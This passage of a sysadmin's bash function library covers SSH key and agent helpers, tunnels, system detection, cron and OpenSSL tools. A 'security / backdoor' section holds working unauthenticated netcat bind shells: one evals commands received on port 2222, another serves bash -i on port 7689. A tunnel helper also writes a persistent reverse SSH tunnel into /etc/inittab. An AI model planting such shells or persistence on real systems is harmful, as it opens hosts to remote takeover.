  if [ "$SSH_AGENT_PID" == "$START_SSH_AGENT_PID" ]; then
    . $ssh_alt_agent
  else
    SSH_AGENT_PID=$START_SSH_AUTH_PID
    SSH_AUTH_SOCK=$START_SSH_AUTH_SOCK
  fi
  ssa
}

function ssfadd() {
  if [ "$SSH_AGENT_PID" == "$START_SSH_AGENT_PID" ]; then
    ssfswitch
    ssh-add -c $@
    ssfswitch
  else
    ssh-add -c $@
  fi
}


#d#==head2 sshpubkey ( $file ) : create pubkey out of private key
#d#
function sshpubkey() {
  local file=$1
  if [ -r $file ]; then
    ssh-keygen -y -f $file >${file}.pub
  else
    1>&2 echo "could not find $file"; return 1;
  fi
}

#d#==head2 ssk : KEY-HANDLING
#d#
#d# KEY-HANDLING : there should be an "extra" function that trys to find out whats wrong with the key and removes it
#d#
function ssk() {
# Warning: the ECDSA host key for 'playstation' differs from the key for the IP address '192.168.180.20'
  if [ "$kprofile_host" == "" ]; then
    if [ "$1" == "" ]; then
      return 1;
    fi
    kprofile_host=$1; shift;
  fi
  local host ip ssh_localkey_byname;
  ssh_localkey_byname=$(ssh-keygen -H -F $kprofile_host|tail -n 1);
  ssh_localkey_byname_array=($ssh_localkey_byname);
  ssh_localkey_byname_type=${ssh_localkey_byname_array[1]}
  ssh_localkey_byname_value=${ssh_localkey_byname_array[2]}
  if [ "$ssh_localkey_byname_value" != "" ]; then
    ssh_remotekey_byname=$(ssh-keyscan -t $ssh_localkey_byname_type $kprofile_host|tail -n 1);
    ssh_remotekey_byname_array=($ssh_remotekey_byname);
    ssh_remotekey_byname_value=${ssh_remotekey_byname_array[2]};
    #echo "(ssh_remotekey_byname=$ssh_remotekey_byname)";
    echo "(ssh_localkey_byname_value=$ssh_localkey_byname_value)";
    echo "(ssh_remotekey_byname_value=$ssh_remotekey_byname_value)";
    if [ "$ssh_localkey_byname_value" != "$ssh_remotekey_byname_value" ]; then
      ssh-keygen -R $kprofile_host
    fi
  fi

  if [[ "$kprofile_host" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    host=$(host $kprofile_host|cut -d" " -f 5);
  else
    ip=$(host $kprofile_host|cut -d" " -f 4);
    ssh_localkey_byip=$(ssh-keygen -H -F $ip|tail -n 1);
    ssh_localkey_byip_array=($ssh_localkey_byip);
    ssh_localkey_byip_value=${ssh_localkey_byip_array[2]}
    if [ "$ssh_localkey_byip_value" != "" ]; then
      ssh_remotekey_byip=$(ssh-keyscan -t $ssh_localkey_byip_type $kprofile_host|tail -n 1);
      ssh_remotekey_byip_array=($ssh_remotekey_byip);
      ssh_remotekey_byip_value=${ssh_remotekey_byip_array[2]};
      echo "(ssh_localkey_byip_value=$ssh_localkey_byip_value)";
      echo "(ssh_remotekey_byip_value=$ssh_remotekey_byip_value)";
      if [ "$ssh_localkey_byip_value" != "$ssh_remotekey_byip_value" ]; then
        ssh-keygen -R $ip
      fi
    fi
  fi
}

#d#==head2 sst : test diffrent ssh-settings
function sst() {
  host=$1
  userlist="kryp root"
  declare -a ssh_option_list;
  ssh_option_list=(
    "-o StrictHostKeyChecking=no"
    "-o PubkeyAuthentication=no -o GSSAPIAuthentication=no"
    "-o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss"
    "-o PubkeyAuthentication=no -o GSSAPIAuthentication=no"
    "-p 23"
    "-p 23 -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss"
  );
  for ssh_options in "${ssh_option_list[@]}"; do
    for user in $userlist; do
      echo "* trying user '$user' and options '$ssh_options'";
      ssh -o BatchMode=yes -o ConnectTimeout=2 $ssh_options ${user}@${host}
      if [ "$?" == 0 ]; then
        return;
       fi
    done
  done
}

#d#==head2 ssht ( $ssh-host , $rstring ) : ssh tunnel, maybe finde a new way?
function ssht() {
  SSHHOST=$1
  RSTRING=$2
  KUSER=${KUSER:-"root"}
  # aus params einen string machen, dabei wird der local-port nicht mitgegeben
  # für jeden host der einmal drinn ist, dann einen port vergeben,
  # wobei das abhängig vom "service" ist. gut wäre z.B. ein "trigger" für
  # vm's vnc. (kann eine liste der vms ausgeben, ps und/oder netstat? )
  # $user@$host -L $LOCALPORT:$HOST(localhost):$PORT ( -N -v for debbuging)
  #cat ~/.ssh/tunnel
  STRING="$KUSER@$SSHHOST $RSTRING"
  if RESULT=$(grep "$STRING" ~/.ssh/tunnel); then
    echo "found: $RESULT";
  else
    echo "not found"
    #NEWPORT=$(_ssht_findport)
    _ssht_findport
    NEWPORT=$(( $LASTPORT-1 ))
    #let NEWPORT=$LASTPORT-1
    RESULT="$NEWPORT $STRING"
    echo "created $RESULT"
    echo "$RESULT" >>~/.ssh/tunnel
  fi
  echo "no just '$RESULT' has to be called "
  _ssht_test $RESULT
}

#d#==head2 _sss_checkhost : set kprofile_host by checking different sources (param, xsel, variable)
#d#
#d# PROBLEM: if param is set, it cant remove it from calling function
#d#
function _sss_checkhost() {
  if [ -z $1 ]; then
    if [ -x /usr/bin/xsel ]; then
      kprofile_host=$(xsel -o)
    elif [ -z $kprofile_host ]; then
      echo "which host?"; return 1;
    fi
  else
    kprofile_host=$1
    shift
  fi
}

#d#==head2 ssd : check host-data and ssh to it (if only one)
function ssd() {
  host=$1
}

#d#==head2 ssr : use root login
#d#
#d# using root
#d#
function ssr() {
  kprofile_host=$1; shift;
  echo -en "\033]0;$kprofile_host\a"
  ssh -t root@${kprofile_host} "$@"
}

#d#==head2 sss
#d#
#d# ssh with screen
#d#
function sss() {
  if [ -z $1 ]; then
    if [ -x /usr/bin/xsel ]; then
      kprofile_host=$(xsel -o)
    elif [ ! -z "$WSLENV" ]; then
      kprofile_host=$(powershell.exe -NoProfile Get-Clipboard 2>&1|tr -d '\r')
    elif [ -z $kprofile_host ]; then
      echo "which host?"; return 1;
    fi
  else
    kprofile_host=$1
    shift
  fi
  #echo "... $kprofile_host"
  if [ "$TERM" == "screen" ]; then
    echo "your already in an screen-session, using normal ssh";
    ssh -t $@ $kprofile_host # "screen -x || screen -d -RR"
  else
    echo -en "\033]0;$kprofile_host\a"
    #sleep 1
    ssh -t $@ $kprofile_host "if test -f screenrc.kryp; then screen -c screenrc.kryp -x || screen -c screenrc.kryp -d -RR; else  screen -x || screen -d -RR ; fi"
    echo -en "\033]0;Terminal\a"
  fi
}


#d#==head2 sshinit
#d#
#d# just create ~/.ssh files
#d#
function sshinit() {
  if [ ! -d ~/.ssh ]; then mkdir ~/.ssh; fi
  chmod 700 ~/.ssh
  if [ ! -e ~/.ssh/authorized_keys ]; then
    touch ~/.ssh/authorized_keys
  fi
  if [ ! -L ~/.ssh/authorized_keys2 ]; then
    ln -fs ~/.ssh/authorized_keys ~/.ssh/authorized_keys2
  fi
  chmod 600 ~/.ssh/*
}

#d#==head2 sshinit
#d#
#d# get "keylist" from server, check whith md5 and install in ~/.ssh/authorized_keys2
#d#
function sshinitfull() {
  sshinit
  if [ ! -z "$REPOSITORY_SERVER" ]; then
    kwget ~/.ssh/authorized_keys2_keylist $REPOSITORY_SERVER/noc/keylist || { echo "failed"; return; }
    local MD1=$(md5sum ~/.ssh/authorized_keys2_keylist|awk '{ print $1 }')
    if [ "$MD1" == "16895caa437780f93f040affcb9814ca" ]; then
    #if [ "$MD1" == "d240fda8f47e0d8db6eeb7111849c09f" ]; then
      if [ "$1" == "n" ]; then
        cat ~/.ssh/authorized_keys2_keylist >~/.ssh/authorized_keys2
      else
        cat ~/.ssh/authorized_keys2_keylist >>~/.ssh/authorized_keys2
      fi
      echo "ok"
    else
      echo "failed"
    fi
  fi
}


#d#==head2 sshcreate
#d#
#d# create ssh-key on this and "slave" host
#d#
function sshcreate() {
  local HOSTNAME=$(hostname)
  if echo "$HOSTNAME"|grep "1" >/dev/null; then
    OH=$(echo "$HOSTNAME"|sed 's/1/2/')
  fi
  if echo "$HOSTNAME"|grep "2" >/dev/null; then
    OH=$(echo "$HOSTNAME"|sed 's/2/1/')
  fi
  if [ -r ~/.ssh/id_rsa ]; then
    echo "* warning : key ~/.ssh/id_rsa already exists"
  fi
  echo -e "\n\n" |ssh-keygen -f ~/.ssh/id_rsa

  echo "adding key to ~/.ssh/authorized_keys2 on $OH"
  cat ~/.ssh/id_rsa.pub |ssh $OH "cat >>~/.ssh/authorized_keys2"

  echo "copy key to $OH"
  scp ~/.ssh/id_rsa* $OH:~/.ssh/

  echo "adding key to ~/.ssh/authorized_keys2"
  cat ~/.ssh/id_rsa.pub >>~/.ssh/authorized_keys2
}

function _ssht_test() {
  #echo "$@ : $1 $2 $3";
  ssh $2 ${1}:$3 -N -v
}

function _ssht_findport() {
  if [ -r ~/.ssh/tunne ]; then
    LASTPORT=$(cat ~/.ssh/tunne |tail|awk '{ print $1 }')
  else
    LASTPORT=9900
  fi
  echo "LASTPORT=$LASTPORT"
}

function ksshtunnel() {
  if [ ! -z "$INITTOOL" ]; then
    if [ ! -r /etc/inittab ]; then
      echo "* fail : could not determine INITTOOL"
      return
    fi
  fi
  echo "TUNNEL_SERVER:"
  read TUNNEL_SERVER
  echo "TUNNEL_USER ($USER):"
  read TUNNEL_USER
  if [ -z $TUNNEL_USER ]; then TUNNEL_USER=$USER;  fi
  echo "TUNNEL_REMOTE_PORT(9999):"
  read TUNNEL_REMOTE_PORT
  if [ -z $TUNNEL_REMOTE_PORT ]; then TUNNEL_REMOTE_PORT=9999; fi
  echo "TUNNEL_LOCAL_PORT(22):"
  read TUNNEL_LOCAL_PORT
  if [ -z $TUNNEL_LOCAL_PORT ]; then TUNNEL_LOCAL_PORT=22; fi
  SSHTEST="/usr/bin/ssh -n -N -T -R ${TUNNEL_REMOTE_PORT}:localhost:${TUNNEL_LOCAL_PORT} ${TUNNEL_USER}@${TUNNEL_SERVER}"
  $SSHTEST
  echo "SSHTEST"
  STRING="tunl:2345:respawn:/usr/bin/ssh -n -N -T -R ${TUNNEL_REMOTE_PORT}:localhost:${TUNNEL_LOCAL_PORT} ${TUNNEL_USER}@${TUNNEL_SERVER}"
  if [ "$INITTOOL" == "sysv" ]; then
    echo "$STRING" >>/etc/inittab
  else
    echo "* fail : cannot handle $INITTOOL"
  fi
}

#d#==head2 ssa : ssh-add alias
#d#
alias ssa="ssh-add -l"

#d#==head2 ssinfo : show agent information
#d#
function ssinfo() {
  echo "SSH_CLIENT=$SSH_CLIENT"
  echo "SSH_TTY=$SSH_TTY"
  echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
  if [[ ! -r "$SSH_AUTH_SOCK" ]]; then
    echo "* dosn't exists"
  fi
  echo "SSH_CONNECTION=$SSH_CONNECTION"
  echo "CVS_RSH=$CVS_RSH"
}




#d#==head2 security
#d#
#d# backdoor
#d#
#d# $ exec 3<>/dev/tcp/127.0.0.1/4444
#d# $ cat <&3
#d#
function backd () {
  if [ ! -r /tmp/nc ]; then
    mkfifo /tmp/nc
  fi
  #exec 3</tmp/nc
  echo "lissening..."
  dolissn=/bin/true
  #while test -r /tmp/nc; do cat /tmp/nc; done |nc -l 2222 | while read line; do
  while test -r /tmp/nc; do cat /tmp/nc; done |
  nc -l 2222 | while read line; do
    line=$(echo "$line"| tr -d "\r")
    echo "line: ($line)";
    if [ "$line" == "quit" ]; then
      echo "killing (PPID:$PPID)(PID:$$)";
      #kill $PPID
      LIST=$(ps --ppid $$ |tail -n +2 |awk '{ print $1 }');
      echo "LIST:$LIST";
      kill $LIST;
      echo "done";
      exit
    elif [[ $line =~ ^cmd.(.*)$ ]]; then
      cmd=${BASH_REMATCH[1]};
      eval $cmd |cat >/tmp/nc
    else
      echo "okay" >/tmp/nc
    fi
  done
  echo "done...";
  #exec 3>&-
  #rm /tmp/nc
  /bin/rm -f /tmp/nc
}

#d#==head2 security
#d#
#d# backdoor
#d#
#d# $ exec 3<>/dev/tcp/127.0.0.1/4444
#d# $ cat <&3
#d#
function backdoor-nc () {
  if [ -x /usr/bin/ncat ]; then
    tool="/usr/bin/ncat"
  fi
  # ncat -l 2000 -k -c 'xargs -n1 echo'


  # Listening backdoor shell on Windows:
  echo "C:\> nc –l –p [LocalPort] –e cmd.exe"

  TMP=$(date +%s)
  # Listening backdoor shell on Linux:
  echo -e "#/bin/sh\n/bin/bash -i" >/tmp/$TMP ; chmod +x /tmp/$TMP
  nc -l -p 7689 -e /tmp/$TMP
  rm /tmp/$TMP
}


################################################################################################ _SEC: DETERMINE
################################################################################################
#d#==head1 DETERMINE
#d#
#d#
#d#
#d#==head2 Detect Distribution
#d#
# see start of script

#d#==head2 servicestatus: get service status
#d#
#alias
function servicestatus() {
  # disable service (sd)? restart? (sr=screen) si: info so: frei ss: belegt
  if [ $INITTOOL == "systemd" ]; then
    :
  elif [ $INITTOOL == "initd" ]; then
    :
  fi
}

#d#==head2 _siinfo : get service info
#d#
function siinfo() {
  local servicename=$1
  package=""
  section=""
  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
    package=$(dpkg-query -S /etc/init.d/$servicename | awk -F: '{ print $1 }')
    if [ "$package" == "" ]; then
       #echo "could not find package for $servicename";
       return 1;
    fi
    #section=$(apt-cache show $package|grep "Section:"| awk '{ print $2 }');
    section=$(dpkg -s $package|grep "Section:"| awk '{ print $2 }');
		#echo "package:"
  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
    package=$(rpmquery -f /etc/init.d/$servicename )
    if [ "$package" == "" ]; then
       #echo "could not find package for $servicename";
       return 1;
    fi
  fi
}


#d#==head2 determine-distribution : debian centos suse
#d#
function determine-distribution() {
  KERNEL_VERSION=`uname -a`
  #@TODO:
  # error on 3.2.25
  # -l     When the variable is assigned a value, all upper-case characters are converted to lower-case.  The upper-case attribute is disabled.
  # declare -l RELEASE_NAME
  if [ -x /usr/bin/lsb_release  ]; then
    #echo "lsb-release"
    RELEASE_NAME=$(/usr/bin/lsb_release -i|cut -b 17-)
    RELEASE_NAMEINFO=$(/usr/bin/lsb_release -d|cut -b 14-)
    LSB_RELEASE=$(/usr/bin/lsb_release -s -c)
    #RELEASE_STRING=$(/usr/bin/lsb_release -i|awk "{ print $3 }") # dose not work
  elif [ -r /etc/os-release ]; then
    . /etc/os-release
    #RELEASE_NAME="$PRETTY_NAME";
    RELEASE_NAME="$ID";
    RELEASE_NAMEINFO="$VERSION_ID";
    #LSB_RELEASE="$ID";
  elif [ -r /etc/redhat-release ]; then
    RELEASE_NAME="$(cat /etc/redhat-release|cut -d ' ' -f 1)"
    RELEASE_NAMEINFO="$(cat /etc/redhat-release|cut -d ' ' -f 3)"
  elif [ -r /etc/issue ]; then
    #echo "issue"
    RELEASE_NAME=`cat /etc/issue | head -n 1 |awk '{ print $1 }'`
    RELEASE_NAMEINFO=$(cat /etc/issue |head -n 1)
  else
    echo "could not find /usr/bin/lsb_release nor /etc/issue"
    return 1
  fi
  RELEASE_NAME=$(echo $RELEASE_NAME| tr "[:upper:]" "[:lower:]")

  case $RELEASE_NAME in
    "ubuntu" | "debian" | "raspbian" )
      PACKAGE_UTIL=dpkg
      SYSLOG_FILE="/var/log/syslog"
        ;;
    "centos" | "rhel" | "fedora" | "suse" | "redhatenterpriseserver" | "redhatenterprise" | "rocky" )
      PACKAGE_UTIL=rpm
      SYSLOG_FILE="/var/log/messages"
        ;;
    "*")
      echo "the RELEASE_NAME=$RELEASE_NAME is unkown"
      if [ -x /usr/bin/yum ]; then # /bin/rpm
        PACKAGE_UTIL=rpm
      elif [ -x /usr/bin/apt-get ]; then # /usr/bin/dpkg
        PACKAGE_UTIL=dpkg
      fi
       ;;
  esac

  #declare -l RELEASE_STRING
  #echo "RELEASE_NAME=$RELEASE_NAME PACKAGE_UTIL=$PACKAGE_UTIL SYSLOG_FILE=$SYSLOG_FILE"
  #return
  if [ "$USER" == "root" ] && [ -d $ADMINDB_DIR ]; then
    echo >$ADMINDB_DIR/distribution
  fi
}

#d#==head2 determine-init : sysv, bsd, upstart, systemd
#d#
function determine-init() {
  #echo "* info : determine-init";
  # init --version |head -n 1
  # init (upstart 0.6.6)

  if [ -d /etc/systemd ]; then
    INITTOOL="systemd"
    INITTOOL_CONFIG=/etc/systemd
  elif [ -r /etc/init/rc.conf ]; then
    INITTOOL="upstart"
    INITTOOL_CONFIG=/etc/init/rc.conf
  elif [ -r /etc/inittab ]; then
    INITTOOL="sysv"
    INITTOOL_CONFIG=/etc/inittab
  else
    echo "* fail : could not determine-init-system"
  fi
}

#d#==head2 determine-logdaemon : syslog (by config ?)
#d#
function determine-logdaemon() {
  #echo "* info : determine-logdaemon";
  if [ -r /etc/syslog ]; then
    LOGDAEMON=syslog
    LOGDAEMON_CONFIG="/etc/syslog"
  elif [ -r /etc/syslog.conf ]; then
    LOGDAEMON=syslog
    LOGDAEMON_CONFIG="/etc/syslog.conf"
    # sysklogd : 1.5-5 : Debian GNU/Linux 5.0
  elif [ -r /etc/rsyslog.conf ]; then
    LOGDAEMON=rsyslog
    LOGDAEMON_CONFIG="/etc/rsyslog.conf"
  else
    echo "* fail : could not determine-logdaemon"
  fi
}

#d#==head2 determine-services like : drbd, keepalived, haproxy, corosync, http, etc.
#d# @category : serviecs
#d#
function determine-services() {
  if [ -e /proc/drbd ]; then
    EENV_SERVICE_LIST="$EENV_SERVICE_LIST drbd";
  fi
  if [ -d /etc/httpd ] || [ -f /etc/apache2/apache2.conf ]; then
    EENV_SERVICE_LIST="$EENV_SERVICE_LIST httpd";
  fi
  if [ -d /etc/keepalived ]; then
    EENV_SERVICE_LIST="$EENV_SERVICE_LIST ka";
  fi
  if [ -d /etc/corosync ]; then
    EENV_SERVICE_LIST="$EENV_SERVICE_LIST cs";
  fi
  if [ -d /etc/ha.d/resource.d/ldirectord ]; then EENV_SERVICE_LIST="$EENV_SERVICE_LIST ld"; fi
  #if [ -d /etc/ha.d ]; then EENV_SERVICE_LIST="$EENV_SERVICE_LIST cs"; fi

}

#d#==head2 determine-hardware dmidecode
#d# @category : hardware
#d#
function determine-hardware() {
  echo "* info : determine-hardware"
  if KDMIDECODE=$(which dmidecode); then
    echo "* warning : could not find dmidecode"
  else
    DMIDECODE=$(dmidecode)
  fi
}

#d#==head2 determine-network : showipt
#d# @category : network
function determine-network() {
  echo "* info : determine-network"

  IPTABLES=$(iptables -L -n -v)
  RESOLVCONF=$(cat /etc/resolv.conf)
  IPADDR=$(ip addr)
  ROUTE=$(route -n)
}







#d#==head2 sinfo : software overview
#d# @category : installation
#d#
function sinfo() {
  version_date=$(date -d @$KVERSION +"%F %H:%M:%S" 2>/dev/null)
  if [ "$?" != 0 ]; then
    echo "FAILED to convert to time: $KVERSION"
  fi
  echo "* info : system info VERSION: $version_date"
  #echo -e "PROFILE:       domain: ${PROFILE_DOMAIN} version: ${VERSION_NUM} admindb: ${ADMINDB_DIR} repository: ${REPOSITORY_SERVER}"
  echo -e "PROFILE:       domain: ${PROFILE_DOMAIN} version: ${VERSION_NUM} debug: ${PROFILE_DEBUG} repository: ${REPOSITORY_SERVER}"
  echo -e "SHELL:         SHELL_I: $SHELL_I  SHELL_L: $SHELL_L SSH_CONNECTION: $SSH_CONNECTION"
  echo -e "RELEASE_NAME:  ${RELEASE_NAME} : ${RELEASE_NAMEINFO}"
  if [ -n $LSB_RELEASE ]; then echo -e "LSB_RELEASE:   $LSB_RELEASE"; fi
  echo -e "PACKAGE_UTIL:  ${PACKAGE_UTIL}"
  echo -e "INITTOOL:      ${INITTOOL} : config: ${INITTOOL_CONFIG}";
  echo -e "LOGDAEMON:     ${LOGDAEMON} : config: ${LOGDAEMON_CONFIG} SYSLOG_FILE: $SYSLOG_FILE";
  #echo -n "PUPPT:"
  _detect-puppet # IN MODULE
  echo
  if [ ! -z $OH ]; then
    echo -e "OH OTHERHOST : $OH"
  fi
  if [ -r /etc/etckeeper/etckeeper.conf ]; then
  	. /etc/etckeeper/etckeeper.conf
  	echo "ETCKEEPER:     $VCS";
  fi
  # @TODO:
  # could check for mysql, drbd, etc.
  # * check by /proc/xxx (easy, but not all, drbd, raid, bond, etc.)
  # * check by package ("expensiv" but maybe with version?)
  # * check by config-file
  # best to check make "easy" checks and than "expensive"

  # should be visible with netstat
  #if MYSQLD=$(which mysqld); then
  #  ksoftware-mysql-status
  #fi

  if [ "$USER" == "root" ]; then
    iptables --list -n -v |grep "^Chain"
    if [ -x /bin/netstat ]; then
      netstat --protocol=inet -nlp | grep "0.0.0.0"
    else
      ss -nap |grep "tcp.*LISTEN"
    fi
  fi
  #caller
}

#d#==head2 hinf : hardware overview
#d#
function hinfo() {
  echo "* info : host info"
  local HINFO_CPU=$(cat /proc/cpuinfo |grep "model name" |head -n 1)
  echo -e "HINFO_CPU      $HINFO_CPU";
  #tags, classes, version, software
  #fdisk -l
  #hdparm -I
  #dmidecode
  #lspci
  #ips # Intelligent process status
  #etc.
  #icheck : check inventory information (name, ip, etc. pp)
  #** aide
}


################################################################################################
#d#==head1 OTHER
#d#


#d#==head2 curlpostdata
#d#
function curlpostdata () {
  url=$1
  file=$2
  #url="http://localhost:8082/ansible/update"
  curl --header "Content-Type:application/json" -d "@$file" -X POST $url
}

#d#==head2 kwget
#d#
function kwget () {
  local where=$1
  local url=$2
  if [ ! -z "$kwegt_tool" ]; then
    $kwegt_tool $where $url
  else
    local curl=$(which curl)
    if [ -z "$curl" ]; then
      wget=$(which wget)
      if [ -z "$wget" ]; then
        echo "did not find either curl nor wget, ..."
      else
        wget --no-check-certificate -O $where $url
        kwegt_tool="wget --no-check-certificate -O"
      fi
    else
      # -L follow_on_redirect -S show-error -s silent -o output
      curl -kLSso $where "$url"
      #echo "($?) stored to $where from ($url)"
      kwegt_tool="curl -LkSso "
    fi
  fi
  #echo "kwegt_tool: $kwegt_tool"
}

#d#==head2 findfilter $find-parameters : filter svn, .git
#d# @category : alias
function findfilter() {
  find $@ |grep -v svn |grep -v CVS  |grep -v .git
}

#d#==head2 manhelp : help
#d# @category : alias
#d#
function manhelp() {
  cat <<'EOF'
d    : documentation
manc : colored man
manf : man force
make-shell-doc :

centos: man-db man-pages
debian: man-db manpages
EOF
  :
}

#d#==head2 manf : show man file
#d# @category : alias
#d#
function manf() {
  if ! man -f $1; then
    man -l $1
  fi
}

#d#==head2 manc : man with colors
#d# @category : alias
#d#
function manc() {
  env \
    LESS_TERMCAP_mb=$(printf "\e[1;31m") \
    LESS_TERMCAP_md=$(printf "\e[1;31m") \
    LESS_TERMCAP_me=$(printf "\e[0m") \
    LESS_TERMCAP_se=$(printf "\e[0m") \
    LESS_TERMCAP_so=$(printf "\e[1;44;33m") \
    LESS_TERMCAP_ue=$(printf "\e[0m") \
    LESS_TERMCAP_us=$(printf "\e[1;32m") \
      man "$@"
}

#d#==head2 shelp : systemd help
#d#
function shelp {
  cat <<'EOF'
sreload="systemctl daemon-reload"
sunits="systemctl list-units"
sshow="systemctl show"
sjour="journalctl -xe"

DropInPaths=/etc/systemd/system/mongodb.service.d/override.conf
/etc/systemd/system/$name.service
EOF
  :
}

#d#==head2 make-shell-doc $file
#d#
#d# creates shell-documentation out of $file using pod2man.
#d# could also update database / upload.
#d# seealso: itmake
#d#
function make-shell-doc() {
  INPUT_FILE=$1
  DATA=$(grep "^#d#" ${INPUT_FILE} |cut -b 5-)
  #echo "$DATA"
  # pod2man
  echo "$DATA" | pod2man -n "${INPUT_FILE}" -c "${PROFILE_DOMAIN} shell script documentation" >${INPUT_FILE}.man
  # pod2html
  # pod2text
}

#d#==head2 showcron = basic display version / cronshow = external script, calendar view
#d#
#d# show all cronfiles
#d#
alias cronl='showcron'
function showcron() {
  crontab -l
  find /etc/cron.* -type f
  echo "seealso: cronshow"
}

function croninfo() {
  if ! pidof atd >/dev/null; then
    echo "atd not running"
  fi
  if [ -x /usr/sbin/cron ]; then
    CRONBIN=/usr/sbin/cron
  elif [ -x /usr/sbin/crond ]; then
    CRONBIN=/usr/sbin/crond
  else
    echo "CRON not found"
    return
  fi
  if ! pidof $CRONBIN >/dev/null; then
    echo "cron not running"
  fi
  systemctl list-timers --all
}

function cronshow() {
  if [ ! -x /usr/bin/croncal.pl ]; then
    curl https://raw.githubusercontent.com/waldner/croncal/master/croncal.pl -o /usr/bin/croncal.pl
    chmod +x /usr/bin/croncal.pl
  fi
  if [ ! -r /tmp/cron.data ]; then
    (cat /var/spool/cron/* /etc/crontab)>/tmp/cron.data
  fi
  showdate=$(date +%s);
  showdate=$(( $showdate + 86400 )) # on day
  datestring=$(date -d @$showdate +"%Y-%m-%d %H:%M");
  echo "showing till $datestring"
  /usr/bin/croncal.pl -e "$datestring" -f /tmp/cron.data
}


#d#==head2 pinfo : find out on witch device iam on
#d#
function pinfo() {
  #fdisk -l
  #cat /proc/mount # cat /proc/mounts |awk '{ print $2 }'
  DIR=$(pwd)
  echo "($DIR)"
  while [ ! -z $DIR ]; do
    DIR=${DIR%/*}
    echo "($DIR)"
    if LINE=$(mount |grep "$DIR "); then
      echo "found :$DIR in $LINE"
      return
    fi
  done
}

#d#==head2 pweb : python webserver
#d#
#d#
function pweb() {
  if [ -x /usr/bin/python3 ]; then
    /usr/bin/python3 -m http.webserver 8000
  elif [ -x /usr/bin/python2 ]; then
    /usr/bin/python2 -m SimpleHTTPServer 8000
  elif [ -x /usr/bin/python ]; then
    /usr/bin/python -m SimpleHTTPServer 8000
  else
    echo "no python installed?"
  fi
}

######################################################################################## OPENSSL
#d#==head2 opensslfile :
#d#
alias opensslkeygen="openssl genrsa 2048"
alias opensslverify="openssl verify -verbose -CAfile ";
alias openssltest="openssl s_client -showcerts -connect ";
function opensslretrieve() {
  if [ -z "$1" ]; then echo "need host as param1 and port as param2"; return 1; fi
  HOST=$1
  if [ -z "$2" ]; then
    PORT=443;
  else
    PORT=$2
  fi
  SERVER=$HOST
  if [ ! -z "$3" ]; then
    SERVER=$3
  fi
  echo "running: openssl s_client -servername $HOST -showcerts -connect $SERVER:$PORT "
  cert="$(echo -n | openssl s_client -servername $HOST -showcerts -connect $SERVER:$PORT | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p')"
  echo "$cert"
  echo "$cert" >/tmp/cert
  openssl x509 -noout -text -in /tmp/cert
  echo "check /tmp/cert"
}
function opensslsum() {
  file=$1
  echo -n "SHA-256: ";
  openssl x509 -noout -fingerprint -sha256 -inform pem -in $file
  echo -n "SHA-1: ";
  openssl x509 -noout -fingerprint -sha1 -inform pem -in $file
  echo -n "MD5: ";
  openssl x509 -noout -fingerprint -md5 -inform pem -in $file
}

function opensslfile() {
  if [ -z "$1" ]; then
    echo "need file as param1"; return 1;
  fi
  file="$1"
  extension=$( echo ${file##*.} | tr '[:upper:]' '[:lower:]' );
  convert='openssl x509  -in mycert.crt -outform PEM -out mycert.pem
openssl x509  -in mycert.cer -inform DER  -out mycert.pem
openssl x509  -in domain.crt -inform DER  -out mycert.pem  -outform PE';

  if [ -r "$file" ]; then
    if [ "$extension" == "csr" ]; then
      openssl req -noout -text -in $file
    elif [ "$extension" == "crt" ] || [ "$extension" == "cert" ]; then
      openssl x509 -noout -purpose -in $file
      openssl x509 -noout -text -in $file
      echo "$convert";
    elif [ "$extension" == "cer" ]; then # windows
      outname="${file%.*}.pem";
      openssl x509 -in $file -inform DER -out $outname -outform PEM
    elif [ "$extension" == "p12" ]; then
      openssl pkcs12 -info -in $file
    elif [ "$extension" == "pem" ]; then
      openssl x509 -noout -purpose -in $file
      openssl x509 -noout -text -in $file
      echo "$convert";
    elif [ "$extension" == "crl" ]; then
      #openssl crl -inform DER -text -noout -in $file
      openssl crl -inform PEM -text -noout -in $file
    elif [ "$extension" == "key" ]; then
      openssl des3 -in $file -text -noout # check key
      openssl rsa -in $file -text -noout # check key
    fi
  else
    echo "file $file not found, creating"
    keyname="${file%.*}.key";
    if [ -r $keyname ]; then
      echo "found $keyname";
      echo "openssl req -new -key $keyname -nodes -out domain.csr -subj '/C=CH/ST=Switzerland/L=Zurich/O=itop/OU=itop dev/CN=itop.com'"
    else
      echo "openssl req -new -newkey rsa:2048 -nodes -out domain.csr -subj '/C=CH/ST=Switzerland/L=Zurich/O=itop/OU=itop dev/CN=itop.com'"
    fi
  fi
}

function opensslremovepassword() {
  file=$1
  openssl rsa -in $file -out ${file}.key
}

function opensslinter() {
  AKEYID=$(openssl x509 -in $1 -noout -text | grep keyid)
  echo "searching for Authkey Identifier  ${AKEYID#*:}   in *Intermediate*  "
  #SEARCHRESULT=$( for i in *Intermediate* ; do [[ $(openssl x509 -in $i -noout -text | grep  ${AKEYID#*:} ) ]] && echo $i ; done )
#  SEARCHRESULT=$( for i in *Intermediate* ; do [[ $(openssl x509 -in $i -noout -text ) ]] && echo $i ; done )
#  SEARCHRESULT=$( for i in *Intermediate* ; do [[ $(openssl x509 -in $i -noout -text | grep  ${AKEYID#*:} ) ]] && echo $i ; done )
  if [[ $SEARCHRESULT ]]  ; then
    echo "$SEARCHRESULT"
  else
    echo "no intermediate certificates found"
  fi
}

function opensslv() {
  local file=$1;
  local extension=${file##*.};
  if [ "$extension" == "req" -o "$extension" == "csr" ]; then
    openssl req -noout -modulus -in $file | openssl md5
  elif [ "$extension" == "crt" -o "$extension" == "cert" -o "$extension" == "pem" ]; then
    openssl x509 -noout -modulus -in $file | openssl md5
  elif [ "$extension" == "key" ]; then
    openssl rsa -noout -modulus -in $file | openssl md5
  else
    echo "could not determinte type";
    opensslhelp
  fi
}

function opensslhelp() {
  cat <<'EOF'
#d#==head2 opensslhelp
#d#
function opensslhelp() {
  cat <<'EOF'
opensslh      : help
opensslhelp   : help
opensslfile   : show file
opensslretrieve : from remote host, with port
openssltest   :
opensslv      : create md5 hash
opensslverify : veryfiy chain

### Create CSR:
# create CSR
#  -config ~/openssl.cnf
